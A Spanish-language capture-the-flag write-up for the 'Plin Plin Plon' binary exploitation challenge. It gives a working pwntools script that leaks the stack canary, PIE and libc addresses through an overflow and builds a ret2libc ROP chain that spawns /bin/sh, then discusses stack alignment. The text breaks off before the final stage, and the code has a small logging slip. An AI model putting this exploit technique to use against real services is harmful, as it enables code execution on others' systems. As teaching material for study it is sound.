Plin Plin Plon

30 de March de 2026

Introduccion

En este reto se nos proporciona:

  • El binario vuln
  • Una glibc libc.so.6
  • Un loader ld-linux-x86-64.so.2

El programa consiste en dejar que el usuario introduzca en bucle una string de hasta 0x80 bytes y el programa la muestra con puts. Aquí hay que hacer dos apuntes:

  • La string se lee con read, por lo que no agrega un \x00 al final. Esto va a ser importante para leakear
  • read lee 0x80 bytes pero el buffer es de 88 (0x58 en hex). ¡AQUÍ HAY BUFFER OVERFLOW!

La estrategia de explotacion será la siguiente:

  1. Leakear Canary, PIE y LIBC con read.
  2. Sobrescribir el Canary con el leak.
  3. Sobrescribir el Saved return address con nuestra ROP Chain.
  4. Escribir “plin plin plon” para salir del bucle y llegar al return.

Fase 1: Leakear

Antes de comenzar hay que saver los offsets a los que esta el input del Canary y del Saved ret. Esto se puede conocer fácilmente con Ghidra: -La distancia del input al Saved ret es de 0x68 bytes -La distancia del input al Canary es de 0x58 bytes

Ahora nos montaremos un script en python para leakear los valores necesarios para nuestra ROP.

from pwn import *

binary = "./vuln"
elf = context.binary = ELF(binary, checksec=False)
libc = elf.libc

p = process(binary)

offset_to_canary = 0x58
offset_to_ret = 0x68

# Leak del canary
payload = b"A"*(offset_to_canary+1) # Offset al canary+1 para sobrescribir el nullbyte del canary
p.send(payload)
p.recv(offset_to_canary+1)
canary = u64(p.recv(7).rjust(8, b"\x00"))
log.info("CANARY --> "+hex(canary))

# Leak del PIE
payload = b"A"*offset_to_ret
p.send(payload)
p.recvline()
p.recv(offset_to_ret)
pie_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK PIE --> "+hex(pie_leak))

# Leak de LIBC
payload = b"A"*(offset_to_ret+0x10)
p.send(payload)
p.recvline()
p.recv(offset_to_ret+0x10)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK LIBC --> "+hex(pie_leak))

Ahora tenemos que conseguir pasar del leak del PIE y Libc a sus respectivas bases. Hacerlo es trivial, solo basta con conectar el binario a gdb despues de los leaks para conseguir las bases y con ellas calcular los offsets.

Una vez calculados los offsets agregamos las siguientes lineas al exploit:

Fase 2: ROPChain

Vamos a hacer la ROPChain típica de un ret2libc: –> POP RDI; RET; /bin/sh ; system

Para hacerlo se pueden calcular los offsets manualmente o tirar de pwntools, yo haré la segunda.

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh\x00"))

payload = b"A"*offset_to_canary + p64(canary) + b"B"*0x8 + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
p.send(b"plin plin plon\x00")
p.interactive()

Ejecutamos y… ¡FALLA! Esto se debe a que el stack no está alineado a mod 16, requisito para llamar a system, y no tenemos espacio para meter más gadgets. Para solucionar este problema tenemos dos soluciones: usar un One Gadget o, alinearnos el stack con el return de plin. Yo optaré por la segunda.

Fase 3: Alinear el Stack

La idea aquí es simple, haremos dos payloads:

  1. El primero sobrescribira el Saved return address con plin, para que al salir alinee el stack y vuelva a la función vulnerable
  2. Ya con el stack alineado volveremos a ejecutar el anterior payload con nuestra ROP Chain, esta funcionará ya que el stack está alineado.

Aquí tenemos la función plin. La idea es que en el primer stage el return del final llame otra vez a plin, alineando el stack para el siguiente stage.
